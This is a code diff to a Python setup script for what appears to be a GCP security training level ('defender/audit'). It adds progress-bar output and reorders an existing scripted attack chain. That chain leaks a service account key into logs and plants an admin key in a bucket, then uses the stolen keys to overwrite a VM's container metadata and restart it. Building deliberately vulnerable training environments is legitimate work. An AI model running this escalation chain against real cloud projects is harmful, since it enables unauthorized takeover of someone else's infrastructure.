@@ -9,6 +9,7 @@ import string
 import google.auth
 import requests
 import shutil
+import progressbar
 
 from googleapiclient import discovery
 from sqlalchemy.sql import text
@@ -32,8 +33,21 @@ LEVEL_PATH = 'defender/audit'
 FUNCTION_LOCATION = 'us-central1'
 DB_SECRET_ID = 'defender_db_password'
 
+class ProgBar:
+    def __init__(self):
+        self.value = 1
+        self.format_custom_text = progressbar.FormatCustomText('Status: %(status_message)50s',{'status_message': 'Deploying Resources...'})
+        self.bar = progressbar.ProgressBar(max_value=11, widgets=[progressbar.Timer(), progressbar.AnimatedMarker(), progressbar.Bar(),progressbar.Percentage(),'  ', self.format_custom_text])
+        self.bar.update(self.value)
+    def tick(self, message):
+        self.value += 1
+        self.bar.update(self.value)
+        self.format_custom_text.update_mapping(status_message=message)
+
 def create(second_deploy=True):
-    print("Level initialization started for: " + LEVEL_PATH)
+    bar = ProgBar()
+    print("\nLevel initialization started for: " + LEVEL_PATH)
+
     nonce = str(random.randint(100000000000, 999999999999))
     credentials, project_id = google.auth.default()
 
@@ -78,20 +92,25 @@ def create(second_deploy=True):
             config_template_args=config_template_args
         )
 
-    print("Level setup started for: " + LEVEL_PATH)
+    print("\nLevel setup started for: " + LEVEL_PATH)
+
+    bar.tick('Creating database tables')
     create_tables(db_secret_value)
+
     dev_key = iam.generate_service_account_key('dev-account')
     dev_sa = service_account.Credentials.from_service_account_info(json.loads(dev_key))
     compute_admin_key = iam.generate_service_account_key('compute-admin')
     logging_key = iam.generate_service_account_key('log-viewer')
+
     # add vm files to bucket
+    bar.tick('Uploading container source to bucket')
     storage_client = storage.Client()
     vm_image_bucket = storage_client.get_bucket(f'vm-image-bucket-{nonce}')
     gcstorage.upload_directory_recursive(f'core/levels/{LEVEL_PATH}/resources/api-engine', f'vm-image-bucket-{nonce}')
-
     storage_blob = storage.Blob('compute-admin.json', vm_image_bucket)
     storage_blob.upload_from_string(compute_admin_key)
     
+    bar.tick('Creating developer logs')
     #os.environ['GOOGLE_APPLICATION_CREDENTIALS'] = 'start/dev-account.json'
     url = "http://us-central1-" + project_id + ".cloudfunctions.net/rm-user-" + nonce
 
@@ -101,11 +120,12 @@ def create(second_deploy=True):
     data = {'name':'Robert Caldwell', 'authentication':dev_key}
     resp = req(url, method = 'POST', body = data, headers = headers)
 
-    hostname = exploit(nonce, logging_key)
-    time.sleep(5)
+    bar.tick('Starting exploit script')
+    hostname = exploit(nonce, logging_key, bar)
     hack(hostname)
+    bar.tick('Exploit complete')
 
-    print(f'Level creation complete for: {LEVEL_PATH}')
+    print(f'\nLevel creation complete for: {LEVEL_PATH}')
     start_message = ('Helpful start message')
     levels.write_start_info(LEVEL_PATH, start_message, file_name="dev-account.json", file_content=dev_key)
 
@@ -143,10 +163,10 @@ def create_tables(db_password):
     user = {'kind':'sql#user','name':'api-engine','project':project_id,'instance':instance_name,'password':db_password}
     service.users().insert(project=project_id, instance=instance_name, body=user).execute()
 
-    proxy = subprocess.Popen([f'core/levels/{LEVEL_PATH}/cloud_sql_proxy', f'-instances={connection_name}=tcp:5432'])
-    try:
-        time.sleep(5)
+    proxy = subprocess.Popen([f'core/levels/{LEVEL_PATH}/cloud_sql_proxy', f'-instances={connection_name}=tcp:5432'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(5)
 
+    try:
         db_config = {
             "pool_size": 5,
             "max_overflow": 2,
@@ -200,22 +220,25 @@ def create_tables(db_password):
     proxy.terminate()
 
 
-def exploit(nonce, logging_key):
+def exploit(nonce, logging_key, bar):
     credentials, project_id = google.auth.default()
     logging_client = glogging.Client(credentials=service_account.Credentials.from_service_account_info(json.loads(logging_key)))
 
+    # Because we are trying to access certain logs immediately after they are generated
+    # we need to keep trying until the log actually shows up before we continue.
     while(True):
         try:
             logger = logging_client.logger('rmUser')
             logs = logger.list_entries()
-            dev_key = list(logs)[-1].payload['auth']
+            dev_key = list(logs)[-1].payload['auth']    
+            storage_client = storage.Client(credentials=service_account.Credentials.from_service_account_info(json.loads(dev_key)))
+            blobs = list(storage_client.list_blobs(f'vm-image-bucket-{nonce}'))
             break
         except:
             time.sleep(5)
 
-    storage_client = storage.Client(credentials=service_account.Credentials.from_service_account_info(json.loads(dev_key)))
-    blobs = list(storage_client.list_blobs(f'vm-image-bucket-{nonce}'))
-    temp_dir = 'test/' ###TODO change me
+    bar.tick('Downloading bucket')
+    temp_dir = 'tmp/'
     os.mkdir(temp_dir)
     for blob in blobs:
         blob.download_to_filename(f'{temp_dir}{blob.name}')
@@ -223,6 +246,7 @@ def exploit(nonce, logging_key):
     with open(f'{temp_dir}compute-admin.json') as keyfile:    
         compute_admin_key = json.loads(keyfile.read())
     
+    bar.tick('Updating Metadata')
     compute_api = discovery.build('compute', 'v1', credentials=service_account.Credentials.from_service_account_info(compute_admin_key))
     api_instance = compute_api.instances().get(project=project_id, zone='us-west1-b', instance='api-engine').execute()
     new_gce = '''
@@ -243,9 +267,13 @@ def exploit(nonce, logging_key):
     fingerprint = api_instance['metadata']['fingerprint']
     payload = {'fingerprint': fingerprint, 'items': [{'key': 'gce-container-declaration', 'value': new_gce}]}
     compute_api.instances().setMetadata(project=project_id, zone='us-west1-b', instance='api-engine', body=payload).execute()
+
+    bar.tick('Stoping compute instance')
     compute_api.instances().stop(project=project_id, zone='us-west1-b', instance='api-engine').execute()
     while(compute_api.instances().get(project=project_id, zone='us-west1-b', instance='api-engine').execute()['status'] != 'TERMINATED'):
         time.sleep(5)
+    
+    bar.tick('Starting compute instance')
     compute_api.instances().start(project=project_id, zone='us-west1-b', instance='api-engine').execute()
     while(compute_api.instances().get(project=project_id, zone='us-west1-b', instance='api-engine').execute()['status'] != 'RUNNING'):
         time.sleep(5)
@@ -271,7 +299,7 @@ def hack(hostname):
         except:
             time.sleep(5)            
             success = False
-    print(response.text)     
+    print("\n" + response.text)     
 
 def delete_secret(secret_id):
     _, project_id = google.auth.default()
